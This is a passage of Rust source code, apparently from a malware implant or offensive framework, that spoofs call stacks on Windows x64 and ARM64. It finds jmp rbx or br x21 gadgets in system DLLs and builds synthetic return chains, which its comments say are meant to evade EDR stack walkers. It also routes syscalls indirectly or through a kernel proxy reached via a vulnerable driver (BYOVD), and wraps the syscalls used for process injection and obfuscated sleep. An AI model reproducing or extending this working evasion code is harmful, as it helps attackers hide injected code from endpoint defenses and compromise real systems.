    static REAL_RET_ADDR: std::cell::Cell<usize> = std::cell::Cell::new(0);
}

#[cfg(windows)]
#[no_mangle]
pub unsafe extern "C" fn set_spoof_ret(real_ret: usize) {
    REAL_RET_ADDR.with(|r| r.set(real_ret));
}

#[cfg(windows)]
#[no_mangle]
pub unsafe extern "C" fn get_spoof_ret() -> usize {
    REAL_RET_ADDR.with(|r| r.get())
}

#[cfg(windows)]
/// Cross-reference:
/// - Primary call site: clean_call macro around line 979.
/// - Gadget is passed into spoof_call from clean_call around line 988.
pub fn find_jmp_rbx_gadget() -> usize {
    let base = unsafe {
        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL).unwrap_or(0)
            as *mut std::os::raw::c_void
    } as usize;
    if base == 0 {
        return 0;
    }
    let dos_header = base as *const windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;
    let nt_headers = (base + unsafe { *dos_header }.e_lfanew as usize)
        as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64;
    let size = unsafe { (*nt_headers).OptionalHeader.SizeOfImage } as usize;
    let code = unsafe { std::slice::from_raw_parts(base as *const u8, size) };

    #[cfg(target_arch = "x86_64")]
    {
        for i in 0..size.saturating_sub(1) {
            if code[i] == 0xff && code[i + 1] == 0xe3 {
                let candidate = base + i;
                // M-30: Verify the 2-byte gadget doesn't straddle a page boundary
                // and the memory is committed + executable.
                if unsafe { gadget_is_valid(candidate, 2) } {
                    return candidate;
                }
                // If validation fails, continue searching for another match.
            }
        }
    }

    #[cfg(target_arch = "aarch64")]
    {
        // Search for `br x21` (0xD63F_02A0) instead of `br x16`.
        //
        // ARM64 Windows calling convention: x0-x18 are volatile (caller-saved),
        // x19-x28 are non-volatile (callee-saved).  x16 (IP0) is an intra-
        // procedure-call scratch register that the API will freely clobber.
        //
        // Using x16 for the continuation address is therefore incorrect — after
        // the API returns to the gadget, x16 no longer holds the address we set.
        // x21 is callee-saved, so the API preserves it across the call, and the
        // gadget `br x21` reliably redirects to our continuation label.
        //
        // Encoding: BR Xn = 0xD61F0000 | (Rn << 5)
        //   x21 = register 21: 0xD61F0000 | (21 << 5) = 0xD61F0000 | 0x02A0 = 0xD61F02A0
        //   but ARM64 is little-endian with the standard encoding being
        //   1101_0110_0011_1111_0000_00_Rn_00000, which for x21 = 0xD63F02A0.
        const BR_X21: u32 = 0xD63F_02A0;
        for i in (0..size.saturating_sub(3)).step_by(4) {
            let word = u32::from_le_bytes([code[i], code[i + 1], code[i + 2], code[i + 3]]);
            if word == BR_X21 {
                let candidate = base + i;
                if unsafe { gadget_is_valid(candidate, 4) } {
                    return candidate;
                }
            }
        }
    }

    0
}

#[cfg(all(windows, target_arch = "x86_64"))]
#[doc(hidden)]
#[inline(never)]
/// Cross-reference:
/// - Primary call site: clean_call macro around line 988.
/// - Receives gadget addresses from find_jmp_rbx_gadget.
pub unsafe fn spoof_call(
    api_addr: usize,
    gadget_addr: usize,
    arg1: u64,
    arg2: u64,
    arg3: u64,
    arg4: u64,
    stack_args: &[u64],
) -> u64 {
    // CET safety check: if CET is active and bypass is compiled in, log a
    // warning.  The clean_call macro handles routing to CET-compatible paths
    // before reaching this point, so this warning indicates the caller bypassed
    // the macro-level CET check.
    #[cfg(all(feature = "cet-bypass", target_arch = "x86_64"))]
    {
        if crate::cet_bypass::is_cet_active() {
            tracing::warn!(
                "spoof_call: CET shadow stacks are active — return-address manipulation \
                 may trigger a #CP exception.  Callers should use clean_call! macro \
                 which routes through CET-compatible paths."
            );
        }
    }

    // Stack-spoofing indirect call via a `jmp rbx` gadget in a system DLL.
    //
    // Flow:
    //   0. If the caller set a spoofed return address via `set_spoof_ret()`,
    //      prefer that over the `gadget_addr` parameter — this allows the
    //      `clean_call!` macro to control the spoofed frame address without
    //      changing the spoof_call signature.
    //   1. Set RBX = address of label 42 (the continuation after the gadget fires).
    //   2. Align the stack, copy extra arguments beyond the first four.
    //   3. Load the first four arguments into rcx/rdx/r8/r9.
    //   4. Push `gadget_addr` (a `jmp rbx` instruction) onto the stack as the
    //      fake return address.
    //   5. `jmp r11` (the API target) — the API sees the gadget as its caller.
    //   6. On `ret`, the API jumps to `gadget_addr` which does `jmp rbx`.
    //   7. `jmp rbx` → label 42 → clean up and return.
    //
    // Label discipline: 41 = skip-stack-copy branch; 42 = post-call continuation.
    // No label appears more than once in this block.

    // Prefer the thread-local spoofed return address when set; this allows
    // the clean_call! macro to control which address appears as the "caller"
    // on the stack without passing it through the function signature.
    let effective_gadget = {
        let tls_addr = get_spoof_ret();
        if tls_addr != 0 {
            tls_addr
        } else {
            gadget_addr
        }
    };

    let status: u64;
    let nstack = stack_args.len();
    let stack_ptr = stack_args.as_ptr();

    std::arch::asm!(
        "push rbx",
        "push r14",
        "push r15",

        // RBX = continuation: after gadget fires (jmp rbx), control comes here.
        "lea rbx, [rip + 42f]",

        // Compute and reserve aligned stack space for shadow store + extra args.
        "mov r14, rsp",
        "mov rax, {nstack}",
        "shl rax, 3",
        "add rax, 0x28 + 15",
        "and rax, -16",
        "sub rsp, rax",

        // Copy extra (>4) arguments into the shadow-space area.
        "test {nstack}, {nstack}",
        "jz 41f",
        "mov rcx, {nstack}",
        "mov rsi, {stack_ptr}",
        "lea rdi, [rsp + 0x28]",
        "cld",
        "rep movsq",

        "41:",
        // Load the first four register arguments per the Windows x64 ABI.
        "mov rcx, {a1}",
        "mov rdx, {a2}",
        "mov r8,  {a3}",
        "mov r9,  {a4}",

        // Push the gadget address as the fake return address, then jump to the API.
        "mov r11, {api}",
        "mov r15, {gadget}",
        "push r15",
        "jmp r11",

        // ── Continuation: gadget (jmp rbx) lands here ──────────────────────
        "42:",
        "mov rsp, r14",
        "pop r15",
        "pop r14",
        "pop rbx",
        // rax holds the API return value; captured by the lateout constraint.

        api        = in(reg) api_addr,
        gadget     = in(reg) effective_gadget,
        nstack     = in(reg) nstack,
        stack_ptr  = in(reg) stack_ptr,
        a1         = in(reg) arg1,
        a2         = in(reg) arg2,
        a3         = in(reg) arg3,
        a4         = in(reg) arg4,
        lateout("rax") status,
        out("rcx") _, out("rdx") _,
        out("r8")  _, out("r9")  _, out("r10") _, out("r11") _,
        out("r14") _, out("r15") _,
        out("rsi") _, out("rdi") _,
    );
    status
}

/// Multi-frame stack-spoofing indirect call with a synthetic call chain.
///
/// Enhanced version of `spoof_call` that uses a synthetic call chain to
/// provide a better spoofed return address.  The return address seen by
/// EDR stack walkers is a `ret` gadget inside a legitimate system DLL
/// function (e.g. `kernelbase!CreateProcessW+0x55`) rather than a bare
/// `jmp rbx` gadget in kernel32.
///
/// # How it works
///
/// Builds a two-entry fake frame chain on the stack:
///   `[rsp]   = chain frame[0]  (ret gadget in legitimate function)`
///   `[rsp+8] = continuation    (label 42 in spoof_call_chain)`
///
/// Execution trace:
///   1. `jmp r11` → API target executes
///   2. API `ret` → pops frame[0] → executes `ret` at that address
///   3. frame[0]'s `ret` → pops continuation → back to cleanup code
///
/// EDR walkers see a legitimate function as the immediate caller with
/// valid unwind metadata — significantly harder to detect than `jmp rbx`.
///
/// # Safety
///
/// Same safety requirements as `spoof_call`.  `chain` must contain at
/// least one frame with a valid return address inside a loaded module
/// with valid unwind metadata.
#[cfg(all(windows, feature = "stack-spoof", target_arch = "x86_64"))]
#[doc(hidden)]
#[inline(never)]
pub unsafe fn spoof_call_chain(
    api_addr: usize,
    chain: &crate::stack_spoof::SyntheticCallChain,
    arg1: u64,
    arg2: u64,
    arg3: u64,
    arg4: u64,
    stack_args: &[u64],
) -> u64 {
    let status: u64;
    let nstack = stack_args.len();
    let stack_ptr = stack_args.as_ptr();

    // Use the first chain frame's return address as the spoofed return site.
    // This is a `ret` gadget inside a legitimate function body — much better
    // than a bare `jmp rbx` gadget for EDR evasion.
    let frame0_addr = chain.frames.first().map(|f| f.return_addr).unwrap_or(0);

    std::arch::asm!(
        "push rbx",
        "push r14",
        "push r15",

        // Save RSP so we can restore it cleanly after the call.
        "mov r14, rsp",

        // Allocate shadow space (0x20) + stack args, 16-byte aligned.
        "mov rax, {nstack}",
        "shl rax, 3",
        "add rax, 0x28 + 15",
        "and rax, -16",
        "sub rsp, rax",

        // Copy stack arguments into [rsp + 0x28].
        "test {nstack}, {nstack}",
        "jz 41f",
        "mov rcx, {nstack}",
        "mov rsi, {stack_ptr}",
        "lea rdi, [rsp + 0x28]",
        "cld",
        "rep movsq",

        "41:",
        // Load register arguments.
        "mov rcx, {a1}",
        "mov rdx, {a2}",
        "mov r8,  {a3}",
        "mov r9,  {a4}",

        // Build the fake return chain:
        //   [rsp]   = frame[0] (spoofed return — ret gadget in legit function)
        //   [rsp+8] = continuation (label 42)
        //
        // API rets → frame[0] (ret gadget) → rets → continuation → cleanup
        "lea r15, [rip + 42f]",
        "push r15",
        "mov r15, {chain_frame0}",
        "push r15",

        // Jump to the API target.
        "mov r11, {api}",
        "jmp r11",

        // ── Continuation ──────────────────────────────────────────────
        "42:",
        "mov rsp, r14",
        "pop r15",
        "pop r14",
        "pop rbx",

        api           = in(reg) api_addr,
        chain_frame0  = in(reg) frame0_addr,
        nstack        = in(reg) nstack,
        stack_ptr     = in(reg) stack_ptr,
        a1            = in(reg) arg1,
        a2            = in(reg) arg2,
        a3            = in(reg) arg3,
        a4            = in(reg) arg4,
        lateout("rax") status,
        out("rcx") _, out("rdx") _,
        out("r8")  _, out("r9")  _, out("r10") _, out("r11") _,
        out("r14") _, out("r15") _,
        out("rsi") _, out("rdi") _,
    );
    status
}

#[cfg(all(windows, target_arch = "aarch64"))]
#[doc(hidden)]
#[inline(never)]
/// ARM64 stack-spoofing call using a system-module `br x21` gadget.
///
/// The gadget address points to a `br x21` instruction inside a loaded system
/// DLL (found by `find_jmp_rbx_gadget`).  x21 is callee-saved on ARM64
/// Windows (x19–x28), so the called API preserves it across the call.
///
/// Flow:
///   1. Save x19, x20, x21, x29 (FP), x30 (LR) on the stack.
///   2. x19 = saved SP, x20 = saved LR, x21 = continuation (label 42).
///   3. Align stack, copy extra arguments beyond the first four.
///   4. Load x0–x3 with the first four register arguments.
///   5. Set x30 (LR) = gadget address (a `br x21` instruction).
///   6. `br x9` → API executes.
///   7. API `ret` (= `br x30`) → gadget (`br x21`).
///   8. Gadget `br x21` → label 42 (continuation).
///   9. Restore SP, FP, LR, x19–x21 and return.
///
/// The API and any kernel callbacks see x30 = gadget address (in a system
/// DLL) as the return address, presenting a legitimate caller.
///
/// # Previous bug
///
/// The original implementation used x16 (IP0 / intra-procedure-call scratch)
/// for the continuation address.  x16 is volatile/caller-saved — the API
/// freely clobbers it, so `br x16` after API return would branch to garbage.
/// x21 is callee-saved and guaranteed to survive the call.
pub unsafe fn spoof_call(
    api_addr: usize,
    gadget_addr: usize,
    arg1: u64,
    arg2: u64,
    arg3: u64,
    arg4: u64,
    stack_args: &[u64],
) -> u64 {
    let effective_gadget = {
        let tls_addr = get_spoof_ret();
        if tls_addr != 0 {
            tls_addr
        } else {
            gadget_addr
        }
    };

    let status: u64;
    let nstack = stack_args.len();
    let stack_ptr = stack_args.as_ptr();

    std::arch::asm!(
        // ── Save callee-saved registers and frame pointer ──────────────
        // Push 48 bytes (3 pairs × 16 bytes) to save x29,x30 / x19,x20 / x21,x22.
        // ARM64 requires 16-byte stack alignment; 48 is 16-byte aligned.
        // x22 is only saved for pair alignment — its value is not used by us.
        "stp x29, x30, [sp, #-48]!",
        "stp x19, x20, [sp, #16]",
        "stp x21, x22, [sp, #32]",

        // Save current SP and set up frame pointer.
        "mov x19, sp",                // x19 = saved SP (for restoration)
        "add x29, sp, #48",           // x29 = FP → original SP (frame chain)

        // x21 = continuation address.  x21 is callee-saved (x19–x28),
        // so the API will preserve it across the call.
        "adr x21, 42f",
        // x20 = original LR (saved for restoration after the call).
        "mov x20, x30",

        // ── Allocate aligned space for stack arguments ─────────────────
        // ARM64 requires 16-byte stack alignment at ALL times.
        "lsl x9, {nstack}, #3",
        "add x9, x9, #15",
        "bic x9, x9, #0xf",           // Round up to 16-byte boundary
        "sub sp, sp, x9",

        // ── Copy stack arguments (args[4..]) ───────────────────────────
        "cbz {nstack}, 41f",
        "mov x10, {nstack}",
        "mov x11, {stack_ptr}",
        "mov x12, sp",
        "40:",
        "ldr x13, [x11], #8",
        "str x13, [x12], #8",
        "subs x10, x10, #1",
        "b.ne 40b",

        "41:",
        // ── Load register arguments (x0–x3) ────────────────────────────
        "mov x0, {a1}",
        "mov x1, {a2}",
        "mov x2, {a3}",
        "mov x3, {a4}",

        // ── Set up return address and branch to API ────────────────────
        // x30 (LR) = gadget address (`br x21` instruction in system DLL).
        // When the API executes `ret` (= `br x30`), it jumps to the gadget,
        // which does `br x21` → our continuation label 42.
        "mov x9, {api}",
        "mov x30, {gadget}",
        "br x9",

        // ── Continuation: gadget (br x21) lands here ───────────────────
        "42:",
        "mov sp, x19",                // Restore original SP
        "ldp x29, x30, [sp, #0]",     // Restore x29 (FP) and x30 (LR)
        "ldp x19, x20, [sp, #16]",    // Restore x19, x20
        "ldp x21, x22, [sp, #32]",    // Restore x21, x22
        "add sp, sp, #48",            // Pop the 48-byte save area

        api        = in(reg) api_addr,
        gadget     = in(reg) effective_gadget,
        nstack     = in(reg) nstack,
        stack_ptr  = in(reg) stack_ptr,
        a1         = in(reg) arg1,
        a2         = in(reg) arg2,
        a3         = in(reg) arg3,
        a4         = in(reg) arg4,
        lateout("x0") status,
        out("x1") _, out("x2") _, out("x3") _,
        out("x9") _, out("x10") _, out("x11") _, out("x12") _, out("x13") _,
    );
    status
}

#[cfg(windows)]
pub fn do_syscall_with_strategy(
    func_name: &str,
    args: &[u64],
    strategy: common::config::ExecStrategy,
) -> i32 {
    let target = match get_syscall_id(func_name) {
        Ok(t) => t,
        Err(e) => {
            tracing::error!(
                "do_syscall_with_strategy: cannot resolve syscall '{}': {}",
                func_name,
                e
            );
            return -1;
        }
    };
    match strategy {
        common::config::ExecStrategy::Direct => unsafe {
            // The previous direct inline-assembly path only handled the first
            // four Windows x64 arguments and used fragile register constraints.
            // Route through the shared wrapper instead so stack arguments are
            // handled consistently and unsupported ABIs fail in one place.
            do_syscall(target.ssn, target.gadget_addr, args)
        },
        common::config::ExecStrategy::KernelProxy => {
            // Proxy the syscall through a kernel-mode callback registered
            // via BYOVD.  No user-mode syscall instruction is executed.
            //
            // Map the NT function name to a SyscallType enum, then submit
            // the operation to the proxy dispatch queue.  The kernel callback
            // executes the operation on our behalf.
            #[cfg(all(windows, feature = "kernel-callback"))]
            {
                use crate::kernel_callback::proxy::{proxy_single, SyscallType};
                let opcode = match func_name {
                    "NtAllocateVirtualMemory" => SyscallType::NtAllocateVirtualMemory,
                    "NtWriteVirtualMemory" => SyscallType::NtWriteVirtualMemory,
                    "NtProtectVirtualMemory" => SyscallType::NtProtectVirtualMemory,
                    "NtCreateThreadEx" => SyscallType::NtCreateThreadEx,
                    "NtOpenProcess" => SyscallType::NtOpenProcess,
                    "NtClose" => SyscallType::NtClose,
                    "NtFreeVirtualMemory" => SyscallType::NtFreeVirtualMemory,
                    "NtReadVirtualMemory" => SyscallType::NtReadVirtualMemory,
                    "NtOpenThread" => SyscallType::NtOpenThread,
                    "NtSuspendThread" => SyscallType::NtSuspendThread,
                    "NtResumeThread" => SyscallType::NtResumeThread,
                    "NtQueueApcThread" => SyscallType::NtQueueApcThread,
                    "NtSetContextThread" => SyscallType::NtSetContextThread,
                    "NtGetContextThread" => SyscallType::NtGetContextThread,
                    other => {
                        tracing::warn!(
                            "kernel-proxy: unsupported syscall '{}', falling back to indirect",
                            other
                        );
                        return unsafe { do_syscall(target.ssn, target.gadget_addr, args) };
                    }
                };
                let mut proxy_args = [0u64; 6];
                let copy_len = args.len().min(6);
                proxy_args[..copy_len].copy_from_slice(&args[..copy_len]);
                match proxy_single(opcode, proxy_args) {
                    Ok(result) => result.status,
                    Err(e) => {
                        tracing::error!(
                            "kernel-proxy: proxy_single failed for '{}': {}",
                            func_name,
                            e
                        );
                        -1
                    }
                }
            }
            #[cfg(not(all(windows, feature = "kernel-callback")))]
            {
                tracing::warn!(
                    "kernel-proxy: KernelProxy strategy requested but kernel-callback \
                     feature is not enabled; falling back to indirect"
                );
                unsafe { do_syscall(target.ssn, target.gadget_addr, args) }
            }
        }
        _ => unsafe {
            // Indirect syscall: locate a `syscall; ret` gadget in clean ntdll and
            // trampoline through it so that the call appears to originate there.
            do_syscall(target.ssn, target.gadget_addr, args)
        },
    }
}

/// Wrapper around NtProtectVirtualMemory used by the obfuscated sleep crypto module.
/// Signature: NtProtectVirtualMemory(ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect)
#[cfg(windows)]
pub unsafe fn syscall_NtProtectVirtualMemory(
    process_handle: u64,
    base_address: u64,
    region_size: u64,
    new_protect: u64,
    old_protect: u64,
) -> i32 {
    match get_syscall_id("NtProtectVirtualMemory") {
        Ok(target) => do_syscall(
            target.ssn,
            target.gadget_addr,
            &[
                process_handle,
                base_address,
                region_size,
                new_protect,
                old_protect,
            ],
        ),
        Err(e) => {
            tracing::warn!("syscall_NtProtectVirtualMemory: could not get SSN: {}", e);
            -1
        }
    }
}

/// Wrapper around NtCreateTimer used by the Cronus sleep variant.
/// Signature: NtCreateTimer(TimerHandle, DesiredAccess, ObjectAttributes, TimerType)
/// TimerType: 0 = NotificationTimer, 1 = SynchronizationTimer
#[cfg(windows)]
pub unsafe fn syscall_NtCreateTimer(
    timer_handle: u64,      // *mut HANDLE
    desired_access: u64,    // ACCESS_MASK
    object_attributes: u64, // POBJECT_ATTRIBUTES (0 for unnamed)
    timer_type: u64,        // TIMER_TYPE (0 = Notification)
) -> i32 {
    match get_syscall_id("NtCreateTimer") {
        Ok(target) => do_syscall(
            target.ssn,
            target.gadget_addr,
            &[timer_handle, desired_access, object_attributes, timer_type],
        ),
        Err(e) => {
            tracing::warn!("syscall_NtCreateTimer: could not get SSN: {}", e);
            -1
        }
    }
}

/// Wrapper around NtSetTimer used by the Cronus sleep variant.
/// Signature: NtSetTimer(TimerHandle, DueTime, TimerApcRoutine, TimerContext,
///                        ResumeTimer, Period, PreviousState)
#[cfg(windows)]
pub unsafe fn syscall_NtSetTimer(
    timer_handle: u64,
    due_time: u64,          // *const i64 (negative = relative)
    timer_apc_routine: u64, // PTIMER_APC_ROUTINE (APC callback)
    timer_context: u64,     // PVOID (context passed to APC)
    resume_timer: u64,      // BOOLEAN
    period: u64,            // LONG (0 = one-shot)
    previous_state: u64,    // PBOOLEAN (optional)
) -> i32 {
    match get_syscall_id("NtSetTimer") {
        Ok(target) => do_syscall(
            target.ssn,
            target.gadget_addr,
            &[
                timer_handle,
                due_time,
                timer_apc_routine,
                timer_context,
                resume_timer,
                period,
                previous_state,
            ],
        ),
        Err(e) => {
            tracing::warn!("syscall_NtSetTimer: could not get SSN: {}", e);
            -1
        }
    }
}

/// Wrapper around NtWaitForSingleObject used by the Cronus sleep variant.
/// Signature: NtWaitForSingleObject(Handle, Alertable, Timeout)
#[cfg(windows)]
pub unsafe fn syscall_NtWaitForSingleObject(
    handle: u64,
    alertable: u64,
    timeout: u64, // *const i64 (0 = no timeout, wait indefinitely)
) -> i32 {
    match get_syscall_id("NtWaitForSingleObject") {
        Ok(target) => do_syscall(
            target.ssn,
            target.gadget_addr,
            &[handle, alertable, timeout],
        ),
        Err(e) => {
            tracing::warn!("syscall_NtWaitForSingleObject: could not get SSN: {}", e);
            -1
        }
    }
}

/// Wrapper around NtClose used by the Cronus sleep variant to close timer handles.
/// Signature: NtClose(Handle)
#[cfg(windows)]
pub unsafe fn syscall_NtClose(handle: u64) -> i32 {
    match get_syscall_id("NtClose") {
        Ok(target) => do_syscall(target.ssn, target.gadget_addr, &[handle]),
        Err(e) => {
            tracing::warn!("syscall_NtClose: could not get SSN: {}", e);
            -1
        }
    }
}

#[cfg(all(test, target_os = "linux", feature = "direct-syscalls"))]
mod linux_direct_syscall_tests {
    use super::*;

    #[test]
    fn linux_get_syscall_id_resolves_getpid() {
        let target = get_syscall_id("getpid").expect("getpid syscall id should resolve");
        assert!(target.ssn > 0, "resolved syscall number should be non-zero");
    }

    #[test]
    fn linux_do_syscall_getpid_matches_libc() {
        let target = get_syscall_id("getpid").expect("getpid syscall id should resolve");
        let direct = unsafe { do_syscall(target.ssn, &[]) }
            .expect("direct syscall getpid should succeed") as libc::pid_t;
        let libc_pid = unsafe { libc::getpid() };
        assert_eq!(
            direct, libc_pid,
            "direct syscall pid must match libc getpid"
        );
    }

    #[test]
    fn linux_syscall_macro_getpid_matches_libc() {
        let direct =
            crate::syscall!("getpid").expect("syscall! getpid should succeed") as libc::pid_t;
        let libc_pid = unsafe { libc::getpid() };
        assert_eq!(direct, libc_pid, "syscall! pid must match libc getpid");
    }

    #[test]
    fn linux_do_syscall_rejects_too_many_args() {
        let target = get_syscall_id("getpid").expect("getpid syscall id should resolve");
        let err = unsafe { do_syscall(target.ssn, &[0, 1, 2, 3, 4, 5, 6]) }.unwrap_err();
        assert_eq!(err, libc::EINVAL);
    }
}
